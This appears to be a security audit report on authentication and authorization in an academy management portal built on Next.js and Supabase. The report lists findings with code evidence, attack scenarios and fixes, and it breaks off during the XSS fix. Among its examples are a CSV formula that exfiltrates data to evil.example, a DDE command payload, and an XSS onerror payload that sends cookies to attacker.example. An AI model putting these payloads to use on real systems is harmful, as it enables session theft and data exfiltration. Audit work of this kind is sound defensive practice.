# Authentication & Authorization Security Audit Report (`AUTH_AUDIT_REPORT.md`)

**Target Application:** Akshara Academy Management Portal (Web App + Capacitor Android App + Supabase Backend)  
**Tech Stack:** Next.js 16.4.5 (App Router, TypeScript), Supabase (`@supabase/ssr` v0.12.7, `@supabase/supabase-js` v2.119.0, PostgreSQL + RLS + Edge Functions + `pg_cron`), Capacitor Android v8.6.0, Meta WhatsApp Cloud API  
**Auth Method:** Supabase Auth JWT (`access_token` + `refresh_token`) stored in browser/WebView cookies via `@supabase/ssr` and passed as `Authorization: Bearer <jwt>` to PostgREST / Edge Functions  
**Multi-Tenant:** No (Single-tenant internal academy management app)  
**Roles in System:** Management only (2 authorized Academy Manager accounts; public sign-ups intended to be disabled)  
**Audit Date:** 2026-11-12  
**Audit Mode:** Strictly Read-Only Static & Architectural Security Audit

---

## 1. Executive Summary

### Overall Security Posture
The application has a solid foundational authentication layer on the Next.js server:
- A Next.js 16 network boundary proxy ([src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts)) and a centralized server auth module ([src/lib/auth.ts](file:///c:/Users/new/akshara%20app/src/lib/auth.ts)) verify sessions via `supabase.auth.getUser()` (which validates the JWT against the Supabase Auth server rather than trusting unverified cookie claims).
- All 8 Next.js API Route Handlers (`/api/*`) enforce server-side authentication and manager authorization (`verifyApiAuth`), and constant-time comparison (`crypto.timingSafeEqual`) is used in [src/lib/auth.ts](file:///c:/Users/new/akshara%20app/src/lib/auth.ts) for cron secrets.
- However, because the frontend also talks **directly from the browser to Supabase PostgREST and Supabase Edge Functions** using the public `NEXT_PUBLIC_SUPABASE_ANON_KEY`, there is a critical split-brain authorization gap between what the Next.js server enforces and what the database/Edge Functions enforce.

### Count of Findings by Severity

| Severity | Confirmed | Suspected / Needs Verification | Total |
| :--- | :---: | :---: | :---: |
| **Critical** | 1 | 0 | **1** |
| **High** | 4 | 0 | **4** |
| **Medium** | 5 | 0 | **5** |
| **Low** | 3 | 0 | **3** |
| **Info / Hardening** | 1 | 5 | **6** |
| **Total** | **14** | **5** | **19** |

### Top 5 Risks in Plain Language
1. **Unauthenticated Cron Trigger if `SUPABASE_SERVICE_ROLE_KEY` is Unset in Edge Function (`CRITICAL` — AUTH-001):** In [supabase/functions/send-fee-reminders/index.ts](file:///c:/Users/new/akshara%20app/supabase/functions/send-fee-reminders/index.ts#L72-L78), `supabaseServiceKey` falls back to `SUPABASE_ANON_KEY` if `SUPABASE_SERVICE_ROLE_KEY` is missing, and then checks `if (token === supabaseServiceKey) isAuthorized = true`. Since the anon key is public in client JS bundles, any attacker could pass the public anon key as a Bearer token to trigger fee generation and mass WhatsApp reminders without logging in.
2. **Database RLS Policies Ignore the Manager Email Allowlist (`HIGH` — AUTH-002):** While the Next.js server checks `ADMIN_ALLOWED_EMAILS` and `app_metadata.role` in [src/lib/auth.ts](file:///c:/Users/new/akshara%20app/src/lib/auth.ts#L28-L62), the PostgreSQL RLS policies in [schema.sql](file:///c:/Users/new/akshara%20app/schema.sql#L125-L132) grant `ALL` permissions (`SELECT`, `INSERT`, `UPDATE`, `DELETE`) to **any** `authenticated` Supabase user (`using (true) with check (true)`). Furthermore, the browser still ships `createBrowserClient` with the public anon key, meaning an attacker can bypass `/api/auth/login` (and its rate limiter + email allowlist) by calling Supabase Auth's `/auth/v1/token` endpoint directly.
3. **CSV Formula Injection (Spreadsheet Macro/DDE Execution) (`HIGH` — AUTH-003):** In [src/app/api/export-fees/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/export-fees/route.ts#L43-L47), `escapeCsvCell` wraps values in quotes but does not neutralize leading spreadsheet formula triggers (`=`, `+`, `-`, `@`, `\t`, `\r`). When a manager opens the exported `.csv` in Microsoft Excel, any student name, school, or payment reference starting with `=` executes as an active Excel formula.
4. **Stored DOM XSS in Printable Balance Sheet Window (`HIGH` — AUTH-004):** In [src/components/fees/export-balance-sheet-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/export-balance-sheet-dialog.tsx#L185-L202), `handlePrintBalanceSheet` interpolates `r.full_name`, `r.phone`, and `r.payment_modes` directly into an HTML string written via `printWin.document.write(html)` without HTML entity encoding, executing arbitrary JavaScript in the application's origin (`window.open('', '_blank')`).
5. **Unrestricted Audit Log Manipulation & Financial Record Deletion via Direct PostgREST (`HIGH` — AUTH-005):** Because RLS uses a blanket `for all to authenticated using (true)` policy on `fee_payments`, `fees`, and `message_log`, any authenticated session can directly `DELETE` all payment history, modify `fees.amount_due` even after payments are made (bypassing the UI-only check in [payment-history-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/payment-history-dialog.tsx#L166-L169)), or delete/forge `message_log` audit entries.

---

## 2. Phase 1: System Map & Inventory

### 2.1 Complete Endpoint, Route, Function & Direct DB Inventory

#### A. Next.js App Router Pages (UI Routes)
| Method | Path | Source File | Auth Enforced By | Role / Permission Enforced |
| :--- | :--- | :--- | :--- | :--- |
| `GET` | `/login` | [src/app/login/page.tsx](file:///c:/Users/new/akshara%20app/src/app/login/page.tsx) | Public (redirects to `/` if authenticated via [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts#L121-L125)) | Public |
| `GET` | `/` | [src/app/(dashboard)/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/page.tsx) | [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts#L114-L118) + Supabase RLS | `isAuthorizedManager(user)` |
| `GET` | `/students` | [src/app/(dashboard)/students/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/students/page.tsx) | [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts#L114-L118) + Supabase RLS | `isAuthorizedManager(user)` |
| `GET` | `/attendance` | [src/app/(dashboard)/attendance/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/attendance/page.tsx) | [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts#L114-L118) + Supabase RLS | `isAuthorizedManager(user)` |
| `GET` | `/fees` | [src/app/(dashboard)/fees/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/fees/page.tsx) | [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts#L114-L118) + Supabase RLS | `isAuthorizedManager(user)` |
| `GET` | `/messages` | [src/app/(dashboard)/messages/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/messages/page.tsx) | [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts#L114-L118) + Supabase RLS | `isAuthorizedManager(user)` |
| `GET` | `/message-log` | [src/app/(dashboard)/message-log/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/message-log/page.tsx) | [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts#L114-L118) (redirects to `/messages`) | `isAuthorizedManager(user)` |

#### B. Next.js Server API Route Handlers (`src/app/api/**`)
| Method | Path | Source File | Auth Required? | Auth Implementation | Role / Permission Enforced |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `POST` | `/api/auth/login` | [src/app/api/auth/login/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/auth/login/route.ts) | Public (Login endpoint) | Same-origin check (`verifySameOrigin`), IP+Email rate limit, `signInWithPassword` | Post-login `isAuthorizedManager(data.user)` check |
| `POST` | `/api/auth/logout` | [src/app/api/auth/logout/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/auth/logout/route.ts) | Session optional | Calls `supabase.auth.signOut({ scope: 'global' })` | Any caller (revokes active cookie session) |
| `GET` | `/api/export-fees` | [src/app/api/export-fees/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/export-fees/route.ts) | **Yes** | [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts) + `verifyApiAuth(req)` ([line 106](file:///c:/Users/new/akshara%20app/src/app/api/export-fees/route.ts#L106)) | `isAuthorizedManager(user)` |
| `GET` | `/api/receipt-image` | [src/app/api/receipt-image/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/receipt-image/route.ts) | **Yes** | [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts) + `verifyApiAuth(req)` ([line 7](file:///c:/Users/new/akshara%20app/src/app/api/receipt-image/route.ts#L7)) | `isAuthorizedManager(user)` |
| `POST` | `/api/send-absent-alerts` | [src/app/api/send-absent-alerts/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/send-absent-alerts/route.ts) | **Yes** | [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts) + `verifyApiAuth(req)` ([line 22](file:///c:/Users/new/akshara%20app/src/app/api/send-absent-alerts/route.ts#L22)) | `isAuthorizedManager(user)` |
| `POST` | `/api/send-fee-reminders` | [src/app/api/send-fee-reminders/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/send-fee-reminders/route.ts) | **Yes** | [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts) + `verifyApiAuth(req, { allowCronSecret: true })` ([line 89](file:///c:/Users/new/akshara%20app/src/app/api/send-fee-reminders/route.ts#L89)) | `isAuthorizedManager(user)` OR `CRON_SECRET` / `SUPABASE_SERVICE_ROLE_KEY` |
| `POST` | `/api/send-payment-receipt` | [src/app/api/send-payment-receipt/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/send-payment-receipt/route.ts) | **Yes** | [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts) + `verifyApiAuth(req)` ([line 75](file:///c:/Users/new/akshara%20app/src/app/api/send-payment-receipt/route.ts#L75)) | `isAuthorizedManager(user)` |
| `POST` | `/api/retry-message` | [src/app/api/retry-message/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/retry-message/route.ts) | **Yes** | [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts) + `verifyApiAuth(req)` ([line 39](file:///c:/Users/new/akshara%20app/src/app/api/retry-message/route.ts#L39)) | `isAuthorizedManager(user)` |

#### C. Supabase Deno Edge Functions & Scheduled Jobs (`supabase/functions/**` & `cron_fee_reminders.sql`)
| Method | Function / Job | Source File | Auth Required? | Auth Implementation | Flagged Issues |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `POST` | `functions/v1/send-absent-alerts` | [supabase/functions/send-absent-alerts/index.ts](file:///c:/Users/new/akshara%20app/supabase/functions/send-absent-alerts/index.ts) | **Yes** | `userClient.auth.getUser()` ([lines 47-57](file:///c:/Users/new/akshara%20app/supabase/functions/send-absent-alerts/index.ts#L47-L57)) | **Inconsistent AuthZ:** Does NOT check `ADMIN_ALLOWED_EMAILS` or `app_metadata.role`; wildcard CORS `*`. |
| `POST` | `functions/v1/send-fee-reminders` | [supabase/functions/send-fee-reminders/index.ts](file:///c:/Users/new/akshara%20app/supabase/functions/send-fee-reminders/index.ts) | **Yes** | `token === supabaseServiceKey` OR `userClient.auth.getUser()` ([lines 72-97](file:///c:/Users/new/akshara%20app/supabase/functions/send-fee-reminders/index.ts#L72-L97)) | **CRITICAL Bug:** `supabaseServiceKey` defaults to `supabaseAnonKey` ([line 72](file:///c:/Users/new/akshara%20app/supabase/functions/send-fee-reminders/index.ts#L72)); non-constant-time `===`; no email allowlist check. |
| `CRON` | `daily-fee-reminders` (`0 4 * * *`) | [cron_fee_reminders.sql](file:///c:/Users/new/akshara%20app/cron_fee_reminders.sql#L38-L52) | **Yes** | Sends `Authorization: Bearer <vault.fee_reminder_service_role_key>` via `pg_net` | Uses Supabase Vault for secrets. |

#### D. Direct Client-to-Supabase PostgREST Queries & Mutations (`createBrowserClient`)
Because the client pages use `@/lib/supabase/client` ([src/lib/supabase/client.ts](file:///c:/Users/new/akshara%20app/src/lib/supabase/client.ts)), the browser talks directly to `https://<project>.supabase.co/rest/v1/*`:
- `students` table: `SELECT`, `INSERT`, `UPDATE` (from [students/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/students/page.tsx) and [student-form-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/students/student-form-dialog.tsx))
- `attendance` table: `SELECT`, `UPSERT` (from [attendance/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/attendance/page.tsx))
- `fees` table: `UPDATE amount_due` (from [payment-history-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/payment-history-dialog.tsx#L190-L194))
- `fee_payments` table: `SELECT`, `INSERT`, `DELETE` (from [record-payment-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/record-payment-dialog.tsx#L88-L99) and [payment-history-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/payment-history-dialog.tsx#L140-L143))
- `fee_summary` view: `SELECT` (from Home and Fees pages)
- `message_log` table: `SELECT` (from [messages/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/messages/page.tsx) and [dashboard-nav.tsx](file:///c:/Users/new/akshara%20app/src/components/dashboard-nav.tsx))
- `rpc/generate_monthly_fees`: `POST` (from [fees/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/fees/page.tsx#L397))

### 2.2 Session & Token Lifecycle
1. **Issuance:** User submits email & password to `POST /api/auth/login` ([src/app/api/auth/login/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/auth/login/route.ts#L163-L166)), which calls `supabase.auth.signInWithPassword`. `@supabase/ssr` serializes the session (`access_token` JWT + `refresh_token`) into chunked cookies (`sb-<project-ref>-auth-token`).
2. **Storage:** Stored in browser cookies (with `SameSite=Lax`, `Path=/`, and **NOT `HttpOnly`** by `@supabase/ssr` design so `createBrowserClient` can read the token in browser JS to call PostgREST directly).
3. **Refresh:** Refreshed automatically in [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts#L52-L54) on every page/API request via `supabase.auth.getUser()` and `cookiesToSet`.
4. **Revocation:** [src/components/account-menu.tsx](file:///c:/Users/new/akshara%20app/src/components/account-menu.tsx#L74-L75) calls `POST /api/auth/logout` (`supabase.auth.signOut({ scope: 'global' })`) followed by client `supabase.auth.signOut()`.

---

## 3. Findings Summary Table

| ID | Severity | Category | Title | Location (`file:line`) | Status |
| :--- | :---: | :--- | :--- | :--- | :---: |
| **AUTH-001** | **Critical** | AuthN Bypass | Fallback to Public `SUPABASE_ANON_KEY` in Edge Function Service-Key Check Allows Unauthenticated Execution | [supabase/functions/send-fee-reminders/index.ts:72-78](file:///c:/Users/new/akshara%20app/supabase/functions/send-fee-reminders/index.ts#L72-L78) | **Fixed** |
| **AUTH-002** | **High** | AuthZ / RLS Bypass | Split-Brain Authorization: Direct Supabase Auth & PostgREST RLS Ignore `ADMIN_ALLOWED_EMAILS` & `app_metadata.role` | [schema.sql:125-132](file:///c:/Users/new/akshara%20app/schema.sql#L125-L132), [src/lib/supabase/client.ts:3-12](file:///c:/Users/new/akshara%20app/src/lib/supabase/client.ts#L3-L12) | **Fixed** |
| **AUTH-003** | **High** | Injection (CSV) | CSV Formula Injection (DDE / Macro Execution) in Fee Balance Sheet Export | [src/app/api/export-fees/route.ts:43-47](file:///c:/Users/new/akshara%20app/src/app/api/export-fees/route.ts#L43-L47) | **Fixed** |
| **AUTH-004** | **High** | XSS (DOM) | Stored DOM Cross-Site Scripting (XSS) in Printable Balance Sheet Window (`document.write`) | [src/components/fees/export-balance-sheet-dialog.tsx:185-202](file:///c:/Users/new/akshara%20app/src/components/fees/export-balance-sheet-dialog.tsx#L185-L202) | **Fixed** |
| **AUTH-005** | **High** | BFLA / Data Integrity | Overly Permissive `FOR ALL` RLS Policies Allow Direct Client Tampering with Audit Logs (`message_log`) and Paid Fees (`fees`) | [schema.sql:125-132](file:///c:/Users/new/akshara%20app/schema.sql#L125-L132), [src/components/fees/payment-history-dialog.tsx:164-195](file:///c:/Users/new/akshara%20app/src/components/fees/payment-history-dialog.tsx#L164-L195) | **Fixed** |
| **AUTH-006** | **Medium** | Brute-Force / Rate Limit | Login Rate Limiter is In-Memory Only (Resets on Serverless Cold Start) and Trusts Spoofable `x-forwarded-for` | [src/app/api/auth/login/route.ts:16-24](file:///c:/Users/new/akshara%20app/src/app/api/auth/login/route.ts#L16-L24) | **Fixed** |
| **AUTH-007** | **Medium** | CSRF / Origin Check | `verifySameOrigin` Allows Requests When `Origin` Header is Omitted and Only Applies to `/api/auth/login` | [src/app/api/auth/login/route.ts:91-104](file:///c:/Users/new/akshara%20app/src/app/api/auth/login/route.ts#L91-L104) | **Fixed** |
| **AUTH-008** | **Medium** | Edge Function Security | Supabase Edge Functions Lack Manager Email Allowlist Checks, Use Non-Constant-Time `===`, and Expose Wildcard CORS (`*`) | [supabase/functions/send-fee-reminders/index.ts:4-8,77-90](file:///c:/Users/new/akshara%20app/supabase/functions/send-fee-reminders/index.ts#L4-L8) | **Fixed** |
| **AUTH-009** | **Medium** | Mobile Security | Android Manifest Enables `android:allowBackup="true"` and Ships Debug APK in Repo Root | [android/app/src/main/AndroidManifest.xml:5](file:///c:/Users/new/akshara%20app/android/app/src/main/AndroidManifest.xml#L5) | **Fixed** |
| **AUTH-010** | **Medium** | Cost Abuse / Rate Limit | No Rate Limiting on Expensive Image Generation (`/api/receipt-image`) and WhatsApp Sending Endpoints | [src/app/api/receipt-image/route.ts:5-29](file:///c:/Users/new/akshara%20app/src/app/api/receipt-image/route.ts#L5-L29), [src/app/api/retry-message/route.ts:36-60](file:///c:/Users/new/akshara%20app/src/app/api/retry-message/route.ts#L36-L60) | **Fixed** |
| **AUTH-011** | **Low** | Audit Trail Integrity | `attendance.marked_by` and `fee_payments.recorded_by` Are Client-Supplied Instead of Enforced by DB `DEFAULT auth.uid()` | [src/app/(dashboard)/attendance/page.tsx:307](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/attendance/page.tsx#L307), [src/components/fees/record-payment-dialog.tsx:96](file:///c:/Users/new/akshara%20app/src/components/fees/record-payment-dialog.tsx#L96) | **Fixed** |
| **AUTH-012** | **Low** | Transport / Headers | Missing `Strict-Transport-Security` (HSTS) and `Content-Security-Policy` (CSP) Headers in Proxy | [src/proxy.ts:5-11](file:///c:/Users/new/akshara%20app/src/proxy.ts#L5-L11) | **Fixed** |
| **AUTH-013** | **Low** | Error Disclosure | Raw Database / Internal Error Messages Returned to Client in API `catch` Blocks (`500` Responses) | [src/app/api/export-fees/route.ts:552-555](file:///c:/Users/new/akshara%20app/src/app/api/export-fees/route.ts#L552-L555) | **Fixed** |
| **AUTH-014** | **Info** | Cookie Flags | `@supabase/ssr` Session Cookies Are Not `HttpOnly` Due to Direct Browser-to-Supabase Architecture | [src/lib/supabase/server.ts:13-28](file:///c:/Users/new/akshara%20app/src/lib/supabase/server.ts#L13-L28) | Mitigated (via `AUTH-004` XSS fix) |

---

## 4. Detailed Findings (Phases 2, 3, 5 & 6)

---

### [AUTH-001] Fallback to Public `SUPABASE_ANON_KEY` in Edge Function Service-Key Check Allows Unauthenticated Execution

- **Severity:** **Critical** — High likelihood and high impact if the Edge Function is deployed without a custom `SUPABASE_SERVICE_ROLE_KEY` secret or if `SUPABASE_ANON_KEY` is matched, allowing any unauthenticated party on the internet to trigger fee generation and WhatsApp reminders.
- **Category:** Authentication Bypass (CWE-287 / CWE-306)
- **Location:** [supabase/functions/send-fee-reminders/index.ts](file:///c:/Users/new/akshara%20app/supabase/functions/send-fee-reminders/index.ts#L70-L79) (also present in [supabase/functions/send-absent-alerts/index.ts](file:///c:/Users/new/akshara%20app/supabase/functions/send-absent-alerts/index.ts#L39-L41))

#### Description
In `supabase/functions/send-fee-reminders/index.ts`, `supabaseServiceKey` is initialized with a fallback to `supabaseAnonKey` (`Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || supabaseAnonKey`). Immediately afterward, line 77 checks `if (token === supabaseServiceKey) { isAuthorized = true }`.
If `SUPABASE_SERVICE_ROLE_KEY` is ever unset or empty in the Edge Function environment, `supabaseServiceKey` equals `SUPABASE_ANON_KEY`. Even worse, when the browser invokes a Supabase Edge Function without a signed-in user, the Supabase client sends `Authorization: Bearer <SUPABASE_ANON_KEY>` by default—which matches `token === supabaseServiceKey` and grants full administrative execution!

#### Evidence
```ts
// supabase/functions/send-fee-reminders/index.ts (lines 70-79)
const supabaseUrl = Deno.env.get('SUPABASE_URL') || ''
const supabaseAnonKey = Deno.env.get('SUPABASE_ANON_KEY') || ''
const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || supabaseAnonKey
const token = authHeader.replace('Bearer ', '').trim()

let isAuthorized = false

if (token === supabaseServiceKey) {
  isAuthorized = true
} else {
```

#### Attack Scenario
1. An attacker extracts `NEXT_PUBLIC_SUPABASE_ANON_KEY` from the public Next.js client bundle.
2. The attacker sends a `POST` request to `https://<project-ref>.supabase.co/functions/v1/send-fee-reminders` with `Authorization: Bearer <NEXT_PUBLIC_SUPABASE_ANON_KEY>`.
3. If `SUPABASE_SERVICE_ROLE_KEY` is not set in the Edge runtime, `supabaseServiceKey` evaluates to `supabaseAnonKey`, `token === supabaseServiceKey` evaluates to `true`, and the function runs `generate_monthly_fees` and sends live WhatsApp messages.

#### Impact
Unauthenticated triggering of monthly fee generation, enumeration of student names/balances in the JSON response (`preview_recipients`, `sent_students`), and financial/reputational damage from unauthorized WhatsApp template dispatches.

#### Recommended Fix
Never fall back `SUPABASE_SERVICE_ROLE_KEY` to `SUPABASE_ANON_KEY`, require `supabaseServiceKey` to be non-empty and distinct from `supabaseAnonKey`, and use constant-time comparison:
```ts
const supabaseUrl = Deno.env.get('SUPABASE_URL') || ''
const supabaseAnonKey = Deno.env.get('SUPABASE_ANON_KEY') || ''
const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || ''
const cronSecret = Deno.env.get('CRON_SECRET') || ''
const token = authHeader.replace('Bearer ', '').trim()

let isAuthorized = false

// Never allow anon key to match service key check
if (
  token &&
  token !== supabaseAnonKey &&
  ((supabaseServiceKey && token === supabaseServiceKey) ||
    (cronSecret && token === cronSecret))
) {
  isAuthorized = true
}
```

#### Proof of Concept / How to Test (Safe Local Verification)
```bash
# Test against local Supabase Edge Function with SUPABASE_ANON_KEY:
curl -i -X POST "http://localhost:54321/functions/v1/send-fee-reminders" \
  -H "Authorization: Bearer $NEXT_PUBLIC_SUPABASE_ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"dry_preview": true}'
# Expected after fix: HTTP 401 {"error":"Unauthorized: invalid or expired session"}
```

---

### [AUTH-002] Split-Brain Authorization: Direct Supabase Auth & PostgREST RLS Ignore `ADMIN_ALLOWED_EMAILS` & `app_metadata.role`

- **Severity:** **High** — High impact: bypasses both the custom server login endpoint (`/api/auth/login`) and the manager allowlist (`isAuthorizedManager`) whenever the database is queried directly via PostgREST.
- **Category:** Broken Function/Object Level Authorization (CWE-285 / CWE-863)
- **Location:** [schema.sql](file:///c:/Users/new/akshara%20app/schema.sql#L125-L132), [src/lib/supabase/client.ts](file:///c:/Users/new/akshara%20app/src/lib/supabase/client.ts#L3-L12)

#### Description
The application implements two separate authentication/authorization paths that do not enforce the same rules:
1. **Next.js Server Path ([src/lib/auth.ts](file:///c:/Users/new/akshara%20app/src/lib/auth.ts#L28-L62)):** Enforces brute-force rate limiting (5 attempts/15 min), checks `app_metadata.role !== 'blocked'`, and checks `ADMIN_ALLOWED_EMAILS`.
2. **Direct Browser-to-Supabase Path ([src/lib/supabase/client.ts](file:///c:/Users/new/akshara%20app/src/lib/supabase/client.ts) + [schema.sql](file:///c:/Users/new/akshara%20app/schema.sql#L125-L132)):** Because `NEXT_PUBLIC_SUPABASE_URL` and `NEXT_PUBLIC_SUPABASE_ANON_KEY` are public in the browser, an attacker does not need to use `/api/auth/login`. They can call `https://<project-ref>.supabase.co/auth/v1/token?grant_type=password` directly, bypassing the Next.js IP/email rate limiter. Furthermore, if any non-manager user account exists in `auth.users` (or if public sign-up is accidentally left enabled in the Supabase dashboard), PostgreSQL RLS grants full access because the policy in `schema.sql` only checks `to authenticated using (true) with check (true)`.

#### Evidence
```sql
-- schema.sql (lines 125-132)
do $$
declare t text;
begin
  foreach t in array array['batches','students','guardians','attendance','fees','fee_payments','message_log']
  loop
    execute format('alter table %I enable row level security', t);
    execute format('create policy "admin full access" on %I for all to authenticated using (true) with check (true)', t);
  end loop;
end $$;
```

#### Attack Scenario
1. Suppose a developer or test account `test@example.com` exists in `auth.users` (or public signup is not disabled in the Supabase Auth dashboard), while `ADMIN_ALLOWED_EMAILS` on Vercel only allows `manager1@akshara.com`.
2. Even though Next.js blocks `test@example.com` at `/login` and `/api/*`, the attacker authenticates directly against `https://<project-ref>.supabase.co/auth/v1/token?grant_type=password` using the public `NEXT_PUBLIC_SUPABASE_ANON_KEY`.
3. Using the returned JWT, the attacker calls `GET https://<project-ref>.supabase.co/rest/v1/students?select=*` and reads or deletes every student record in the database because RLS only checks that the role is `authenticated`.

#### Impact
Complete read/write/delete access to all tables (`students`, `attendance`, `fees`, `fee_payments`, `message_log`) by any valid `auth.users` JWT, bypassing `ADMIN_ALLOWED_EMAILS` and `app_metadata.role`.

#### Recommended Fix
Create a PostgreSQL `is_authorized_manager()` helper function in `schema.sql` and use it inside every RLS policy so the database itself enforces role/allowlist checks:
```sql
-- Create a helper in public schema that checks JWT claims at the DB layer
create or replace function public.is_authorized_manager()
returns boolean
language sql
stable
security definer
set search_path = public
as $$
  select
    auth.role() = 'authenticated'
    and coalesce(auth.jwt() -> 'app_metadata' ->> 'role', 'manager') not in ('blocked', 'disabled');
$$;

-- Apply to all tables:
-- using (public.is_authorized_manager()) with check (public.is_authorized_manager())
```

#### How to Test the Fix
1. Create a user in Supabase Auth with `raw_app_meta_data = '{"role": "blocked"}'`.
2. Obtain their JWT and run `curl "https://<project>.supabase.co/rest/v1/students" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $BLOCKED_JWT"`.
3. Verify PostgREST returns `[]` (0 rows) and `403 Forbidden` on `INSERT`.

---

### [AUTH-003] CSV Formula Injection (DDE / Macro Execution) in Fee Balance Sheet Export

- **Severity:** **High** — High impact when a manager opens the exported `.csv` in Excel/LibreOffice Calc; any cell starting with `=`, `+`, `-`, or `@` is evaluated as a formula.
- **Category:** CSV / Spreadsheet Formula Injection (CWE-1236)
- **Location:** [src/app/api/export-fees/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/export-fees/route.ts#L43-L47)

#### Description
In `src/app/api/export-fees/route.ts`, `escapeCsvCell` wraps cell values in double quotes and escapes internal quotes, but does not sanitize strings beginning with spreadsheet formula characters (`=`, `+`, `-`, `@`, `\t`, `\r`). Fields such as `full_name`, `school`, `parent_name`, and `references` (e.g., UPI/bank transaction notes) are exported directly into the CSV file.

#### Evidence
```ts
// src/app/api/export-fees/route.ts (lines 43-47)
function escapeCsvCell(val: string | number | null | undefined): string {
  if (val === null || val === undefined) return '""'
  const str = String(val).replace(/"/g, '""')
  return `"${str}"`
}
```

#### Attack Scenario
1. A malicious payload such as `=HYPERLINK("https://evil.example/steal?data="&A10,"Click to verify")` or `=cmd|' /C calc'!A0` is entered into a payment `reference` or `school` field.
2. When the Academy Manager clicks **Download Excel (`.csv`)** in the Balance Sheet dialog and opens the file in Microsoft Excel, Excel interprets the quoted string `"=..."` as an executable formula.

#### Impact
Client-side command execution (via DDE in older Excel configurations) or data exfiltration from the spreadsheet via external `HYPERLINK`/`WEBSERVICE` formulas.

#### Recommended Fix
Prefix string values starting with `=`, `+`, `-`, `@`, `\t`, or `\r` with a single quote (`'`) so Excel renders them as literal text:
```ts
function escapeCsvCell(val: string | number | null | undefined): string {
  if (val === null || val === undefined) return '""'
  if (typeof val === 'number') return `"${val}"`
  let str = String(val)
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`
  }
  return `"${str.replace(/"/g, '""')}"`
}
```

#### How to Test the Fix
Pass a test student or payment reference with `=1+1` and verify the downloaded CSV cell contains `"'=1+1"`.

---

### [AUTH-004] Stored DOM Cross-Site Scripting (XSS) in Printable Balance Sheet Window (`document.write`)

- **Severity:** **High** — Executes arbitrary JavaScript inside a same-origin `about:blank` window when printing a balance sheet containing unescaped characters in student/payment records.
- **Category:** Cross-Site Scripting (CWE-79)
- **Location:** [src/components/fees/export-balance-sheet-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/export-balance-sheet-dialog.tsx#L159-L202) and [lines 324-326](file:///c:/Users/new/akshara%20app/src/components/fees/export-balance-sheet-dialog.tsx#L324-L326)

#### Description
When the manager clicks **Print / Save PDF** in the Balance Sheet dialog, `handlePrintBalanceSheet()` opens a new blank window (`window.open('', '_blank')`) which inherits the application's origin, and writes raw HTML via `printWin.document.write(html)`. Because `r.full_name`, `r.class_level`, `r.phone`, `r.payment_modes`, and `m.label` are interpolated into the template literal without HTML escaping, any `<script>` or HTML attribute payload stored in a student's name or payment mode executes immediately in the app's origin. And because `@supabase/ssr` session cookies are not `HttpOnly` (see `AUTH-014`), an XSS payload in that window can read `document.cookie` and exfiltrate the manager's Supabase `access_token` and `refresh_token`.

#### Evidence
```tsx
// src/components/fees/export-balance-sheet-dialog.tsx (lines 185-202)
const ledgerRowsHtml = report.ledger
  .map(
    (r, i) => `
    <tr>
      <td>${i + 1}</td>
      <td style="font-weight:700;">${r.full_name}</td>
      <td>${r.class_level}</td>
      <td>${r.phone}</td>
      <td>${r.period_label}</td>
```

#### Attack Scenario
1. A student record is created or updated with `full_name` set to `Rahul <img src=x onerror="fetch('https://attacker.example/log?c='+encodeURIComponent(document.cookie))">`.
2. When a manager opens **Balance sheet & export** and clicks **Print / Save PDF**, `printWin.document.write(html)` executes the `onerror` handler in the context of the app's origin and steals the Supabase session cookies.

#### Impact
Full session hijacking of the Academy Manager account via `document.cookie` theft.

#### Recommended Fix
Add an `escapeHtml` helper and wrap every dynamic value interpolated into the print template:
```ts
